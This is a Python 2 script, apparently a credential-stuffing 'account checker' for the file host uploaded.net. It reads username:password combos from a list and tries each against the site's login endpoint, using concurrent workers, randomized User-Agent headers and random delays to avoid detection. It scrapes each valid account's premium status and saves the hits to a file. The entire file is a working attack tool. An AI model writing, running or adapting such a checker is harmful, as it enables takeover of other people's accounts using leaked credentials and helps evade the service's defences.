# -*- coding: utf-8 -*-
import argparse
import gevent#apt-get install gevent
from gevent.queue import *
import gevent.monkey
from timeit import default_timer as timer
import random
gevent.monkey.patch_all()
from tqdm import * #pip install tqdm
import requests #pip install requests
import cookielib
from bs4 import BeautifulSoup #pip install BeautifulSoup4
asci = '''
UL.NET CHECKER - by sup3ria
'''
print asci

parser = argparse.ArgumentParser(description='uploaded.net checker 2016')
parser.add_argument('-t','--threads', help='Threads', required=False,type=int,default="1")
parser.add_argument('-i','--input', help='input.txt', required=False,type=str,default="accounts.txt")
parser.add_argument('-o','--output', help='output.txt', required=False,type=str,default="ul_valid.txt")
parser.add_argument('-s','--sleep', help='Sleeping in between?', required=False,type=bool,default=True)
parser.add_argument('-v','--valids', help='print valid accounts', required=False,type=bool,default=False)

args = vars(parser.parse_args())
workers = args['threads']
file_in  = args['input']
file_out = args['output']
sleeper = args['sleep']


x = [u'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36', 
u'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
u'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17', 
u'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1', 
u'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36', 
u'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36',
u'Mozilla/5.0 (Windows NT 6.2; rv:21.0) Gecko/20130326 Firefox/21.0',
u'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F',
u'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)',
u'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36']


def parse(html):
    try:
        soup = BeautifulSoup(str(html), "lxml")
        table = soup.find("table", { "class" : "data"})
        soup = BeautifulSoup(str(table), "lxml")
        data = soup.findAll("th")
        #id_nr = data[0].text.strip()
        status = data[1].text.strip()
        period = data[3].text.strip()
        #email = data[5].text.strip()
        return status,period
    except:
        pass

def sub_worker(task):
    ua = random.choice(x)
    jar = cookielib.CookieJar()
    usr= task.split(':')[0]
    pwd = task.split(':')[1]
    s = requests.Session()
    url = "http://uploaded.net/io/login"
    q = s.get(url, cookies=jar,headers={'User-Agent': ua,'Accept':'*/*'})
    data = {'id': usr, 'pw': pwd}
    r = s.post(url, data=data, cookies=jar,allow_redirects=True,headers={'User-Agent': ua,'Accept':'*/*'})
    if '{"err":"User and password do not match!"}' not in r.text:
        g = s.get("http://uploaded.net/me", cookies=jar,headers={'User-Agent': ua,'Accept':'*/*'})
        data = parse(g.content)
        return data
    else:
        return False

def worker():
    while not q.empty():
        task = q.get()
        try:
            data = sub_worker(task)
            if data != False:
                try:
                    if data[1].encode('utf-8').strip() == '•••':
                        line = task+'|'+data[0].encode('utf-8').strip()
                    else:
                        line = task+'|'+data[0].encode('utf-8').strip() +'>'+data[1].encode('utf-8').strip()
                    with open(file_out, 'a') as f:
                        v.append(line)
                        f.write(line+'\n')
                except:
                    pass
                    #gevent.sleep(random.uniform(1.201,2.905))
                    #q.put(task, timeout=3)
        finally:
            pbar.update()
            gevent.sleep(random.uniform(0.201,0.905))

def loader():
    with open(file_in, "r") as text_file:
        for line in text_file:
            try:
                if len(line.strip()) > 1:
                    q.put(line.strip(), timeout=10)
            except:
                pass

def asynchronous():
    threads = []
    for i in range(0, workers):
        threads.append(gevent.spawn(worker))
    start = timer()
    gevent.joinall(threads,raise_error=True)
    end = timer()
    pbar.close()
    print "\nFound",len(v),"valid account(s)."
    if args['valids']:
        print ""
        for i in v:
            print i
    print "\n\nTime passed: " + str(end - start)[:6]

v = []
q = gevent.queue.JoinableQueue()
gevent.spawn(loader).join()
pbar = tqdm(total=q.qsize())
asynchronous()
